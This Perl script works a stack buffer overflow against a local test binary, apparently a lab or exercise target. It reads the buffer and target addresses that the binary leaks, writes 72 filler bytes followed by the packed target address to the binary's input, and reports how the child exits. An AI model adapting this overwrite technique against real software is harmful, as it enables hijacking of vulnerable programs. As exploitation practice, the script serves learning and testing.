#!/usr/bin/perl

use IPC::Open2;
use POSIX qw(:signal_h :errno_h :sys_wait_h);

print "spawn child process\n";
my $pid = open2(my $chld_out, my $chld_in, '../test/vuln');
#my $pid = open2(my $chld_out, my $chld_in, 'bash -c "exit 1"');
my $first = <$chld_out>;
chomp $first;
print "child wrote {$first}\n";
$first =~ /buf is at (\S+), target is at (\S+)/ or die;
my ($buf, $target) = ($1, $2);

my $address = hex($target);
my $address_str = '';
for my $i (0..7) {
    $address_str .= chr($address & 0xff);
    $address >>= 8;
}

my $exploit = 'A'x(64+8) . $address_str;
print "exploit is {$exploit}\n";
print $chld_in $exploit;
close $chld_in;

while(my $line = <$chld_out>) {
    chomp $line;
    print "child process output {$line}\n";
}

waitpid( $pid, 0 );
if(WIFEXITED($?)) {
    my $exit_status = $? >> 8;
    print "child exited with status $exit_status\n";
} 
elsif(WIFSIGNALED($?)) {
    my $sig = WTERMSIG($?);
    print "child died with signal $sig\n";
}
else {
    print "child exited with unknown exception\n";
}
